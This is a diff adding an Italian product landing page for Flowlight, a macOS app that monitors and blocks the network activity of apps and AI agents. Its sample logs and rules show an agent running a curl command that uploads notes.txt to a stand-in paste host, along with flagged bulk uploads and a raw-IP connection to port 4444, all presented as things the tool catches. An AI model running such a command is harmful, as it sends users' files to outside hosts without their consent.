@@ -1,0 +1,683 @@
+<!doctype html>
+<html lang="it">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Flowlight per macOS</title>
+<meta name="description" content="Flowlight è l&#x27;analisi di rete app per app per macOS, open source, con uno sguardo più attento su agenti IA, strumenti e server MCP.">
+<link rel="canonical" href="https://flowlight.xinbetween.com/it/">
+<link rel="alternate" hreflang="en" href="https://flowlight.xinbetween.com/">
+<link rel="alternate" hreflang="de" href="https://flowlight.xinbetween.com/de/">
+<link rel="alternate" hreflang="es" href="https://flowlight.xinbetween.com/es/">
+<link rel="alternate" hreflang="fr" href="https://flowlight.xinbetween.com/fr/">
+<link rel="alternate" hreflang="it" href="https://flowlight.xinbetween.com/it/">
+<link rel="alternate" hreflang="ja" href="https://flowlight.xinbetween.com/ja/">
+<link rel="alternate" hreflang="ko" href="https://flowlight.xinbetween.com/ko/">
+<link rel="alternate" hreflang="pt-PT" href="https://flowlight.xinbetween.com/pt-PT/">
+<link rel="alternate" hreflang="zh-Hans" href="https://flowlight.xinbetween.com/zh-Hans/">
+<link rel="alternate" hreflang="zh-Hant" href="https://flowlight.xinbetween.com/zh-Hant/">
+<link rel="alternate" hreflang="x-default" href="https://flowlight.xinbetween.com/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="Flowlight">
+<meta property="og:locale" content="it_IT">
+<meta property="og:title" content="Flowlight per macOS">
+<meta property="og:description" content="Flowlight è l&#x27;analisi di rete app per app per macOS, open source, con uno sguardo più attento su agenti IA, strumenti e server MCP.">
+<meta property="og:url" content="https://flowlight.xinbetween.com/it/">
+<meta property="og:image" content="https://flowlight.xinbetween.com/assets/social-card.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta property="og:image:alt" content="Flowlight — application-aware network monitoring for macOS, with focused visibility into AI agents">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="theme-color" content="#f4f5f8" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#0d0f16" media="(prefers-color-scheme: dark)">
+<link rel="icon" href="../assets/icon.png">
+<link rel="apple-touch-icon" href="../assets/apple-touch-icon.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,500;12..96,700;12..96,800&family=IBM+Plex+Mono:wght@400;500&family=IBM+Plex+Sans:wght@400;500;600&display=swap">
+<link rel="stylesheet" href="../assets/site.css">
+<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "WebSite", "@id": "https://flowlight.xinbetween.com/#website-it", "url": "https://flowlight.xinbetween.com/it/", "name": "Flowlight", "inLanguage": "it", "publisher": {"@id": "https://flowlight.xinbetween.com/#publisher"}}, {"@type": "Organization", "@id": "https://flowlight.xinbetween.com/#publisher", "name": "xinbetween", "url": "https://flowlight.xinbetween.com/", "logo": "https://flowlight.xinbetween.com/assets/icon.png", "sameAs": ["https://github.com/xinbetween/flowlight"]}, {"@type": "SoftwareApplication", "@id": "https://flowlight.xinbetween.com/#app-it", "name": "Flowlight", "description": "Flowlight è l'analisi di rete app per app per macOS, open source, con uno sguardo più attento su agenti IA, strumenti e server MCP.", "url": "https://flowlight.xinbetween.com/it/", "applicationCategory": "SecurityApplication", "applicationSubCategory": "Network monitor", "operatingSystem": "macOS 15 or later", "softwareVersion": "0.7.7", "downloadUrl": "https://github.com/xinbetween/flowlight/releases/latest/download/Flowlight.dmg", "installUrl": "https://flowlight.xinbetween.com/it/docs/#install", "image": "https://flowlight.xinbetween.com/assets/social-card.png", "screenshot": "https://flowlight.xinbetween.com/assets/screenshots/agents.png", "license": "https://www.gnu.org/licenses/gpl-3.0.html", "isAccessibleForFree": true, "publisher": {"@id": "https://flowlight.xinbetween.com/#publisher"}, "offers": {"@type": "Offer", "price": "0", "priceCurrency": "USD", "availability": "https://schema.org/InStock"}}]}</script>
+</head>
+<body>
+<a class="skip" href="#main" style="position:absolute;left:-999px">Vai al contenuto</a>
+<header class="nav">
+  <div class="wrap">
+    <a class="brand" href="../it/"><img src="../assets/icon.png" alt="">Flowlight</a>
+    <nav class="nav-links" aria-label="Sito">
+      <a href="../it/#agents">Agenti IA</a>
+      <a href="../it/docs/">Documentazione</a>
+      <a href="../it/privacy/">Privacy</a>
+      <a href="../releases/">Versioni</a>
+      <a href="../it/about/">Informazioni</a>
+      <a href="https://github.com/xinbetween/flowlight">GitHub</a>
+    </nav>
+    <details class="lang">
+      <summary aria-label="Lingua" title="Lingua"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3c2.5 2.6 2.5 15.4 0 18M12 3c-2.5 2.6-2.5 15.4 0 18"/></svg><span class="lang-name">Italiano</span></summary>
+      <div class="lang-menu"><a href="../" hreflang="en" lang="en">English</a><a href="../de/" hreflang="de" lang="de">Deutsch</a><a href="../es/" hreflang="es" lang="es">Español</a><a href="../fr/" hreflang="fr" lang="fr">Français</a><span lang="it" aria-current="true">Italiano</span><a href="../pt-PT/" hreflang="pt-PT" lang="pt-PT">Português</a><a href="../ja/" hreflang="ja" lang="ja">日本語</a><a href="../zh-Hans/" hreflang="zh-Hans" lang="zh-Hans">简体中文</a><a href="../zh-Hant/" hreflang="zh-Hant" lang="zh-Hant">繁體中文</a><a href="../ko/" hreflang="ko" lang="ko">한국어</a></div>
+    </details>
+    <a class="btn btn-primary btn-sm" href="https://github.com/xinbetween/flowlight/releases/latest/download/Flowlight.dmg">Scarica</a>
+  </div>
+</header>
+<main id="main">
+  <section class="hero">
+    <div class="wrap">
+      <div>
+        <p class="eyebrow">Analisi di rete app per app · macOS 15+</p>
+        <h1 style="margin-top:16px">Vedi la rete delle tue app.<br><span class="flow">Capisci i tuoi agenti IA.</span></h1>
+        <p class="lede">Flowlight mostra quali applicazioni si connettono, dove vanno e quanti dati spostano. Per gli agenti IA risale a strumenti,
+          server MCP e destinazioni: così host sconosciuti, canali sensibili e caricamenti insoliti saltano all'occhio.</p>
+        <div class="cta">
+          <a class="btn btn-primary" href="https://github.com/xinbetween/flowlight/releases/latest/download/Flowlight.dmg">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 4v11m0 0-4.5-4.5M12 15l4.5-4.5M5 20h14"/></svg>
+            Scarica per macOS
+          </a>
+          <a class="btn btn-ghost" href="https://github.com/xinbetween/flowlight">
+            <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 .5a11.5 11.5 0 0 0-3.64 22.41c.58.1.79-.25.79-.56v-2c-3.2.7-3.88-1.37-3.88-1.37-.52-1.33-1.28-1.69-1.28-1.69-1.05-.72.08-.7.08-.7 1.16.08 1.77 1.19 1.77 1.19 1.03 1.77 2.7 1.26 3.36.96.1-.75.4-1.26.73-1.55-2.56-.29-5.25-1.28-5.25-5.69 0-1.26.45-2.29 1.19-3.1-.12-.29-.52-1.46.11-3.05 0 0 .97-.31 3.17 1.18a11 11 0 0 1 5.77 0c2.2-1.49 3.17-1.18 3.17-1.18.63 1.59.23 2.76.11 3.05.74.81 1.19 1.84 1.19 3.1 0 4.42-2.7 5.4-5.27 5.68.41.36.78 1.06.78 2.14v3.17c0 .31.21.67.8.56A11.5 11.5 0 0 0 12 .5Z"/></svg>
+            Metti una stella su GitHub
+          </a>
+          <p class="brew"><code>brew install --cask xinbetween/tap/flowlight</code><button type="button" class="copy" data-copy="brew install --cask xinbetween/tap/flowlight">Copia</button></p>
+          <p class="meta-row"><span>v0.7.7</span><span>macOS 15+</span><span>Universale</span><span>GPL-3.0</span><span>Nessuna telemetria</span></p>
+        </div>
+      </div>
+
+      <div class="log" role="img" aria-label="Esempio del registro delle connessioni in diretta di Flowlight: traffico per app e dominio, una connessione rifiutata da una regola, una protezione che toglie strumenti a un agente, un AirDrop su Wi-Fi peer-to-peer e una risposta simulata">
+        <div class="log-head"><span class="dot"></span><span class="dot"></span><span class="dot"></span>
+          <span style="margin-left:8px">connessioni</span><span class="live"><span class="pulse"></span>in diretta</span></div>
+        <ol id="log">
+          <li><span class="app">claude</span><span class="dest"><b>api.anthropic.com</b> · https:443</span><span class="bytes up">↑ 1.4 MB</span></li>
+          <li class="tool"><span class="app"></span><span class="note">↳ Bash: curl -s paste.example/up -d @notes.txt</span></li>
+          <li class="block"><span class="app">claude › curl</span><span class="dest"><b>paste.example</b> · https:443</span><span class="bytes up">rifiutata</span>
+            <span class="note">⛔ regola «Claude Code non può raggiungere paste.example»</span></li>
+          <li><span class="app">Chrome</span><span class="dest"><b>www.youtube.com</b> · quic:443</span><span class="bytes down">↓ 9.2 MB</span></li>
+          <li class="flag"><span class="app">codex</span><span class="dest"><b>uploads.paste.example</b> · https:443</span><span class="bytes up">↑ 180 MB</span>
+            <span class="note">⚠ esfiltrazione: 180 MB verso host non IA in 1 h</span></li>
+          <li class="p2p"><span class="app">sharingd</span><span class="dest"><b>AirDrop · dispositivo vicino</b> · awdl0</span><span class="bytes up">↑ 4.1 GB</span></li>
+          <li class="guard"><span class="app">claude</span><span class="dest"><b>api.anthropic.com</b> · tools/list</span><span class="bytes down">−3 strumenti</span>
+            <span class="note">🛡 protezione: Bash, Write, Edit mai offerti</span></li>
+          <li><span class="app">Slack</span><span class="dest"><b>wss-primary.slack.com</b> · websocket</span><span class="bytes down">↓ 120 KB</span></li>
+          <li class="flag"><span class="app">claude</span><span class="dest"><b>smtp.relay.example</b> · smtp:587</span><span class="bytes up">↑ 2.4 MB</span>
+            <span class="note">⚠ l'agente ha usato l'e-mail (SMTP submission)</span></li>
+          <li class="mock"><span class="app">Cursor</span><span class="dest"><b>api2.cursor.sh</b> · POST /v1/chat</span><span class="bytes down">503</span>
+            <span class="note">✎ risposta di Flowlight, mai inoltrata</span></li>
+        </ol>
+      </div>
+    </div>
+  </section>
+
+  <section class="shot" aria-label="Schermata">
+    <div class="wrap">
+      <div class="frame"><img src="../assets/screenshots/agents.png?v=c3fae806" width="1600" height="1075"
+        alt="La vista Agenti IA di Flowlight. Claude Code, Cursor, Codex e uno script Python sono elencati con i loro provider IA, il traffico inviato altrove e i contrassegni di rischio per SMTP, SSH, FTP, un caricamento di grandi dimensioni e un IP grezzo."></div>
+      <p class="caption">La vista Agenti IA: il provider del modello di ogni agente e tutto il resto con cui ha parlato. Mostrata con dati dimostrativi.</p>
+    </div>
+  </section>
+  <section class="band" id="use-cases">
+    <div class="wrap">
+      <div class="section-head">
+        <p class="eyebrow">Quando serve Flowlight</p>
+        <h2>Domande a cui risponde in pochi secondi</h2>
+      </div>
+      <div class="cases">
+        <div class="case"><span class="view">Agenti IA</span><h3>Un agente lavora mentre sei in riunione</h3>
+          <p>Vedi tutti gli host che l'agente e i suoi strumenti hanno contattato oltre al provider del modello, e ricevi un avviso se esce dall'elenco consentiti, invia e-mail o carica 100&nbsp;MB verso una destinazione nuova.</p></div>
+        <div class="case"><span class="view">Rapporti</span><h3>Il caricamento è schizzato e non sai perché</h3>
+          <p>Passa il puntatore sul picco per vedere l'app che c'è dietro, fai clic per passare dall'ora al minuto e segui la traccia fino al dominio e all'IP esatti.</p></div>
+        <div class="case"><span class="view">Avvisi</span><h3>Una nuova app ha iniziato a telefonare a casa</h3>
+          <p>Primo contatto con un nuovo dominio, una porta non standard o un picco di traffico: ognuno genera un avviso che indica l'app e il numero che lo ha fatto scattare.</p></div>
+        <div class="case"><span class="view">In diretta</span><h3>Qualcosa sta saturando la connessione proprio ora</h3>
+          <p>Le app più attive aggiornate ogni secondo, con la destinazione più trafficata per ciascuna, e le velocità in diretta nella barra dei menu.</p></div>
+        <div class="case"><span class="view">Rapporti</span><h3>I dati dell'hotspot sono spariti questo mese</h3>
+          <p>Passa alla vista mensile e raggruppa per app. Chi consuma di più è la prima riga, con esportazione CSV se ti servono le prove.</p></div>
+        <div class="case"><span class="view">Rapporti · Destinazione</span><h3>Devi verificare dove finiscono i dati</h3>
+          <p>Raggruppa per destinazione per vedere tutte le app che parlano con un dominio, o per IP per vedere che cosa c'è dietro un indirizzo.</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="band" id="views">
+    <div class="wrap">
+      <div class="section-head">
+        <p class="eyebrow">Dentro l'app</p>
+        <h2>Otto viste, una domanda ciascuna</h2>
+      </div>
+      <div class="views">
+        <div class="view-card"><span class="glyph live"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 12h4l3-8 4 16 3-8h4"/></svg></span>
+          <h3>In diretta</h3><p>Cosa si muove adesso? Velocità per app, gli ultimi due minuti, la destinazione più trafficata.</p><span class="keys">⌘1</span></div>
+        <div class="view-card"><span class="glyph ai-agents"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10.5 4.5l1.7 4.8L17 11l-4.8 1.7-1.7 4.8-1.7-4.8L4 11l4.8-1.7z"/><path d="M18 14.5l.8 2.2 2.2.8-2.2.8-.8 2.2-.8-2.2-2.2-.8 2.2-.8z"/></svg></span>
+          <h3>Agenti IA</h3><p>Cosa fanno i miei agenti oltre a chiamare il modello? Provider, altri host, contrassegni di rischio.</p><span class="keys">⌘2</span></div>
+        <div class="view-card"><span class="glyph reports"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 20V10M10 20V4M16 20v-7M22 20H2"/></svg></span>
+          <h3>Rapporti</h3><p>Dove è finito tutto? Dal secondo all'anno, per app, destinazione o IP, con grafici e CSV.</p><span class="keys">⌘3</span></div>
+        <div class="view-card"><span class="glyph alerts"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3 2 20h20L12 3z"/><path d="M12 10v4M12 17.5v.01"/></svg></span>
+          <h3>Avvisi</h3><p>Cosa non tornava? Avvisi per app, spiegati, con la destinazione e la soglia.</p><span class="keys">⌘4</span></div>
+        <div class="view-card"><span class="glyph rules"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 11V6a2 2 0 0 1 4 0v5M9 11V4a2 2 0 0 1 4 0v7M13 11V6a2 2 0 0 1 4 0v8"/><path d="M17 11v3a5 5 0 0 1-5 5h-1a6 6 0 0 1-6-6v-2"/></svg></span>
+          <h3>Regole</h3><p>Cosa ho rifiutato, e sta funzionando? Ogni regola, che cosa ha bloccato e il flusso di tutte le decisioni.</p><span class="keys">⌘5</span></div>
+        <div class="view-card"><span class="glyph ask"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12a8 8 0 0 1-8 8H7l-4 3v-5.5A8 8 0 1 1 21 12z"/></svg></span>
+          <h3>Chiedi</h3><p>Domande in linguaggio naturale, con risposte tratte dalla cronologia e sotto l'elenco di tutte le query eseguite.</p><span class="keys">⌘7</span></div>
+        <div class="view-card"><span class="glyph devices"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 9a10 10 0 0 1 14 0M8 12.5a6 6 0 0 1 8 0M11 16h2"/></svg></span>
+          <h3>Dispositivi</h3><p>Bluetooth e USB: che cosa è abbinato, che cosa è collegato e quando è cambiato. Disattivato finché non lo attivi.</p><span class="keys">⌘8</span></div>
+        <div class="view-card"><span class="glyph inspect"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="3" y="4" width="18" height="12" rx="2"/><path d="M8 20h8M12 16v4"/><path d="M10 10a2 2 0 1 1 4 0v1"/></svg></span>
+          <h3>Ispeziona</h3><p>Opzionale. Cosa ha inviato davvero l'agente, e quale chiamata a uno strumento l'ha prodotta? Richieste decifrate, chiamate agli strumenti, risultati.</p><span class="keys">⌘6</span></div>
+      </div>
+    </div>
+  </section>
+
+
+  <section class="band" id="capture">
+    <div class="wrap">
+      <div class="section-head">
+        <p class="eyebrow">Acquisizione</p>
+        <h2>Visibilità di rete app per app</h2>
+        <p class="lede">Flowlight attribuisce alle applicazioni l'attività TCP e UDP osservata e registra in locale destinazioni, protocolli
+          e byte conteggiati. La copertura dipende dall'origine di acquisizione scelta e dalle informazioni disponibili sui nomi host.</p>
+      </div>
+      <div class="pair">
+        <div class="fact">
+          <span class="figure">Per applicazione</span>
+          <p>Applicazioni, strumenti a riga di comando e servizi in background attribuiti per processo, inclusi i processi figli riconosciuti degli agenti.</p>
+        </div>
+        <div class="fact">
+          <span class="figure">Nomi host risolti</span>
+          <p>Appresi dai nomi dei server TLS osservati e dalle risposte DNS. Quando non c'è un nome host, Flowlight può identificare, se lo vuoi, il proprietario della rete.</p>
+        </div>
+        <div class="fact">
+          <span class="figure">1 s <small>→ 1 anno</small></span>
+          <p>Zoom dal secondo all'anno. Raggruppa per app, per destinazione o per IP. Passa il puntatore su un picco per vedere l'app che c'è dietro.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="band" id="agents">
+    <div class="wrap agents">
+      <div class="section-head" style="margin:0">
+        <p class="eyebrow">Sorveglianza degli agenti IA</p>
+        <h2>Controlla come gli agenti IA usano la rete</h2>
+        <p class="lede">Flowlight riconosce per nome 16 agenti e classifica gli altri processi che contattano uno dei
+          27 provider noti di API LLM. Il traffico dei browser è escluso dalla classificazione automatica degli agenti.</p>
+        <div class="agent-list" aria-label="Agenti riconosciuti">
+          <span class="chip">Claude Code</span><span class="chip">Codex</span><span class="chip">Cursor</span>
+          <span class="chip">Windsurf</span><span class="chip">GitHub Copilot</span><span class="chip">Gemini CLI</span>
+          <span class="chip">Aider</span><span class="chip">Goose</span><span class="chip">OpenCode</span>
+          <span class="chip">Ollama</span><span class="chip">LM Studio</span><span class="chip">ChatGPT</span>
+          <span class="chip">Claude</span><span class="chip">Zed</span><span class="chip">Perplexity</span><span class="chip">ZCode</span>
+          <span class="chip">+ qualsiasi cosa chiami un'API LLM</span>
+        </div>
+      </div>
+      <div class="rules">
+        <div class="rule">
+          <span class="sev critical">⚠ Critico</span>
+          <div><h3>Violazione dell'elenco consentiti</h3>
+            <p>«Claude Code può parlare con GitHub e npm, nient'altro.» Aggiungi domini, IP o intervalli, oppure parti da una preimpostazione.
+              Tutto il resto genera un avviso, con <b>Consenti</b> a un clic — e, se glielo chiedi, l'estensione di rete
+              rifiuta la connessione invece di limitarsi a segnalarla.</p>
+            <p class="example">Claude Code › curl ha contattato paste.example:443, che non è nell'elenco consentiti di Claude Code</p></div>
+        </div>
+        <div class="rule">
+          <span class="sev critical">⛔ Rifiuta</span>
+          <div><h3>Regole, per il tempo che decidi tu</h3>
+            <p>Indica un'app, un agente, una destinazione o un singolo URL e bloccalo: fai clic con il tasto destro sulla riga in cui l'hai notato.
+              Per sempre, fino a un orario, fino alla chiusura di Flowlight o in una fascia oraria scelta, con un interruttore di pausa e una via d'uscita
+              a ogni rifiuto. Vince la regola più specifica e, a parità, vince il blocco.</p>
+            <p class="example">Cursor ⇥ raw.githubusercontent.com · rifiutata 4 volte · nei giorni feriali 18:00–09:00</p></div>
+        </div>
+        <div class="rule">
+          <span class="sev critical">⛔ Rifiuta</span>
+          <div><h3>Protezioni sugli strumenti di un agente</h3>
+            <p>Blocca un server MCP, uno dei suoi strumenti o una singola risorsa. Uno strumento rifiutato viene tolto dall'elenco che l'agente
+              invia al modello, così al modello non viene mai offerto: nessun rifiuto su cui discutere, nessun ciclo di tentativi. Richiede l'ispezione
+              HTTPS e non è una sandbox: Flowlight lo dice, invece di lasciar intendere il contrario.</p>
+            <p class="example">Claude Code: niente Bash, niente write* · 12 strumenti tolti dalle dichiarazioni di oggi</p></div>
+        </div>
+        <div class="rule">
+          <span class="sev info">↳ Attribuzione</span>
+          <div><h3>Strumenti e server MCP</h3>
+            <p>Il curl, il git o l'npm che lo strumento shell di un agente esegue, e i server MCP che avvia, contano come traffico dell'agente, con i nomi presi dalla sua configurazione MCP.</p>
+            <p class="example">api.github.com · tramite MCP github &nbsp;·&nbsp; paste.example · tramite curl</p></div>
+        </div>
+        <div class="rule">
+          <span class="sev info">⌕ Da attivare</span>
+          <div><h3>Chiamate agli strumenti, dalle risposte del modello</h3>
+            <p>Per i provider supportati e per le applicazioni instradate attraverso l'ispezione HTTPS, Flowlight può registrare gli strumenti dichiarati, le chiamate agli strumenti richieste dal modello e i risultati restituiti, e poi mettere in relazione le richieste di rete di uno strumento con la chiamata che le ha originate.</p>
+            <p class="example">curl → paste.example:443 &nbsp;←&nbsp; Bash: curl -s https://paste.example/up -d @notes.txt</p></div>
+        </div>
+        <div class="rule">
+          <span class="sev info">⌕ Su disco</span>
+          <div><h3>Cosa è configurato a fare ogni agente</h3>
+            <p>Con il tuo consenso, Flowlight legge la configurazione dell'agente: skill, subagent, comandi slash, hook, regole di permesso e server MCP. Solo i nomi, mai il tuo codice, e nulla lascia il Mac.</p>
+            <p class="example">Hook di notifica → curl -s -d … https://ntfy.sh/… &nbsp;·&nbsp; allow: Bash(curl:*)</p></div>
+        </div>
+        <div class="rule">
+          <span class="sev critical">⚠ Critico</span>
+          <div><h3>Canale sensibile</h3>
+            <p>L'agente invia e-mail, trasferisce file, apre SSH o desktop remoto, passa da un tunnel o da un proxy, oppure parla con un database.</p>
+            <p class="example">Claude Code ha usato SMTP-SUBMISSION verso smtp.relay.example:587, 2.4 MB inviati</p></div>
+        </div>
+        <div class="rule">
+          <span class="sev critical">⚠ Critico</span>
+          <div><h3>Possibile esfiltrazione</h3>
+            <p>Più di 100 MB in un'ora verso host che non sono provider IA.</p>
+            <p class="example">Codex ha caricato 180 MB verso host non IA nell'ultima ora: uploads.paste.example</p></div>
+        </div>
+        <div class="rule">
+          <span class="sev warning">▲ Avvertenza</span>
+          <div><h3>Host senza nome</h3>
+            <p>Una connessione a un IP grezzo, senza nome host, su una porta insolita.</p>
+            <p class="example">python3 si è connesso a 203.0.113.45:4444 (tcp) senza nome host</p></div>
+        </div>
+        <div class="rule">
+          <span class="sev warning">▲ Avvertenza</span>
+          <div><h3>Attivo mentre sei via</h3>
+            <p>I dati continuano a muoversi dopo 15 minuti senza input da tastiera o mouse.</p>
+            <p class="example">Codex ha spostato 48 MB nell'ultimo minuto mentre eri via (nessun input da 37 min)</p></div>
+        </div>
+        <div class="rule">
+          <span class="sev info">ⓘ Info</span>
+          <div><h3>Nuova destinazione, prima</h3>
+            <p>Gli agenti hanno un periodo di apprendimento di 1 ora prima che scattino gli avvisi sui nuovi domini (24 ore per le altre app). Ogni soglia è regolabile.</p></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="band" id="protocols">
+    <div class="wrap">
+      <div class="section-head">
+        <p class="eyebrow">Copertura</p>
+        <h2>108 protocolli, riconosciuti in 13 famiglie</h2>
+        <p class="lede">Riconosciuti dalla porta e dai primi byte in transito (handshake TLS, metodi HTTP, saluti di posta e SSH,
+          richieste SOCKS). Le famiglie contrassegnate come <b style="color:var(--critical)">canale di uscita</b> sono quelle
+          sorvegliate dalle regole per gli agenti.</p>
+      </div>
+      <div class="families">
+        <div class="family"><header><h3>Web</h3><span class="count">9</span></header>
+          <div class="protos"><span>HTTP</span><span>HTTPS</span><span>HTTP/2</span><span>QUIC · HTTP/3</span><span>WebSocket</span><span>TLS</span><span>HTTP proxy</span></div></div>
+        <div class="family egress"><header><h3>E-mail</h3><span class="tag">canale di uscita</span></header>
+          <div class="protos"><span>SMTP</span><span>Submission 587</span><span>SMTPS</span><span>IMAP</span><span>IMAPS</span><span>POP3</span><span>POP3S</span></div></div>
+        <div class="family egress"><header><h3>Trasferimento file</h3><span class="tag">canale di uscita</span></header>
+          <div class="protos"><span>FTP</span><span>FTPS</span><span>TFTP</span><span>SFTP</span><span>SMB</span><span>AFP</span><span>NFS</span><span>rsync</span><span>git</span><span>svn</span></div></div>
+        <div class="family egress"><header><h3>Accesso remoto</h3><span class="tag">canale di uscita</span></header>
+          <div class="protos"><span>SSH</span><span>RDP</span><span>VNC</span><span>Telnet</span><span>TeamViewer</span></div></div>
+        <div class="family egress"><header><h3>VPN, proxy e tunnel</h3><span class="tag">canale di uscita</span></header>
+          <div class="protos"><span>WireGuard</span><span>OpenVPN</span><span>IPsec</span><span>L2TP</span><span>PPTP</span><span>Tailscale</span><span>SOCKS5</span><span>Tor</span></div></div>
+        <div class="family egress"><header><h3>Database e cache</h3><span class="tag">canale di uscita</span></header>
+          <div class="protos"><span>Postgres</span><span>MySQL</span><span>SQL Server</span><span>Oracle</span><span>Redis</span><span>MongoDB</span><span>Cassandra</span><span>Elasticsearch</span><span>Memcached</span></div></div>
+        <div class="family egress"><header><h3>Peer-to-peer</h3><span class="tag">canale di uscita</span></header>
+          <div class="protos"><span>BitTorrent</span></div></div>
+        <div class="family"><header><h3>Risoluzione dei nomi</h3><span class="count">8</span></header>
+          <div class="protos"><span>DNS</span><span>DNS over TLS</span><span>DNS over HTTPS</span><span>DNS over QUIC</span><span>mDNS</span><span>LLMNR</span><span>NetBIOS</span><span>WHOIS</span></div></div>
+        <div class="family"><header><h3>Messaggistica e code</h3><span class="count">12</span></header>
+          <div class="protos"><span>MQTT</span><span>AMQP</span><span>Kafka</span><span>NATS</span><span>XMPP</span><span>IRC</span><span>NNTP</span></div></div>
+        <div class="family"><header><h3>Voce, video e streaming</h3><span class="count">5</span></header>
+          <div class="protos"><span>SIP</span><span>SIPS</span><span>STUN</span><span>RTSP</span><span>Zoom media</span></div></div>
+        <div class="family"><header><h3>Servizi di rete</h3><span class="count">19</span></header>
+          <div class="protos"><span>NTP</span><span>DHCP</span><span>SNMP</span><span>Syslog</span><span>SSDP</span><span>Kerberos</span><span>LDAP</span><span>IPP</span><span>BGP</span></div></div>
+        <div class="family"><header><h3>Push e sviluppo</h3><span class="count">6</span></header>
+          <div class="protos"><span>APNs</span><span>FCM</span><span>Docker</span><span>Kubernetes</span><span>Ollama</span></div></div>
+      </div>
+      <p class="footnote">Con l'estensione di rete attiva, Flowlight osserva i flussi TCP e UDP idonei. ICMP, gli altri protocolli su IP
+        grezzo e una parte del traffico di sistema restano fuori da questa copertura. I contenuti cifrati restano cifrati, a meno che un'applicazione non venga instradata esplicitamente attraverso l'ispezione HTTPS.</p>
+    </div>
+  </section>
+
+
+  <section class="band" id="compare">
+    <div class="wrap">
+      <div class="section-head">
+        <p class="eyebrow">Come si colloca</p>
+        <h2>Pensato per la domanda che gli altri strumenti saltano</h2>
+        <p class="lede">Flowlight osserva e spiega e, quando glielo chiedi, rifiuta: una destinazione, un URL o uno strumento che un agente
+          non dovrebbe avere.</p>
+      </div>
+      <div class="table-wrap">
+        <table class="compare">
+          <thead><tr><th></th><th class="us">Flowlight</th><th>Activity Monitor</th><th>Firewall<br><small>es. Little Snitch, LuLu</small></th><th>Analizzatori di pacchetti<br><small>es. Wireshark</small></th></tr></thead>
+          <tbody>
+            <tr><td>Quale app lo ha inviato</td><td class="us yes">Sì</td><td class="yes">Sì</td><td class="yes">Sì</td><td class="no">No</td></tr>
+            <tr><td>Verso quale dominio è andato</td><td class="us yes">Sì, da SNI e DNS</td><td class="no">No</td><td class="yes">Sì</td><td class="yes">Sì, per pacchetto</td></tr>
+            <tr><td>Cronologia dal secondo all'anno</td><td class="us yes">Sì</td><td class="no">No</td><td class="part">Dipende</td><td class="part">File di acquisizione</td></tr>
+            <tr><td>Regole per gli agenti IA</td><td class="us yes">Sì</td><td class="no">No</td><td class="no">No</td><td class="no">No</td></tr>
+            <tr><td>Le chiamate agli strumenti di un agente, legate al suo traffico</td><td class="us yes">Sì, da attivare</td><td class="no">No</td><td class="no">No</td><td class="no">No</td></tr>
+            <tr><td>Blocca le connessioni</td><td class="us yes">Sì, con l'estensione di rete</td><td class="no">No</td><td class="yes">Sì</td><td class="no">No</td></tr>
+            <tr><td>Blocca gli strumenti di un agente, non solo il suo traffico</td><td class="us yes">Sì, da attivare</td><td class="no">No</td><td class="no">No</td><td class="no">No</td></tr>
+            <tr><td>Libero e open source</td><td class="us yes">Sì, GPL-3.0</td><td class="part">Integrato</td><td class="part">Dipende</td><td class="yes">Sì</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </section>
+
+  <section class="band" id="about">
+    <div class="wrap about">
+      <div style="display:grid;gap:16px">
+        <p class="eyebrow">Perché esiste Flowlight</p>
+        <blockquote>I tuoi strumenti ora decidono da soli. Devi poter vedere <span>dove vanno i tuoi dati</span> quando lo fanno.</blockquote>
+      </div>
+      <div class="prose">
+        <p>Gli agenti di programmazione leggono i tuoi file, eseguono comandi e chiamano strumenti, e ognuno di quegli strumenti può aprire un socket.
+          A settembre 2026 si è scoperto che un'app di programmazione IA impacchettava per intero gli spazi di lavoro degli utenti, cronologia Git compresa,
+          e li caricava in background. Il ricercatore che l'ha scoperta se n'è accorto solo perché una cartella di cache stava divorando spazio su disco.</p>
+        <p>I caricamenti erano cifrati, ma i fatti che contavano no: quale app, quale host, quanti megabyte e quando.
+          macOS sa già tutto questo. Flowlight lo mette sullo schermo, ne conserva la cronologia e segnala ciò che non torna.</p>
+        <p><a href="../it/about/">Leggi la storia completa →</a></p>
+      </div>
+    </div>
+  </section>
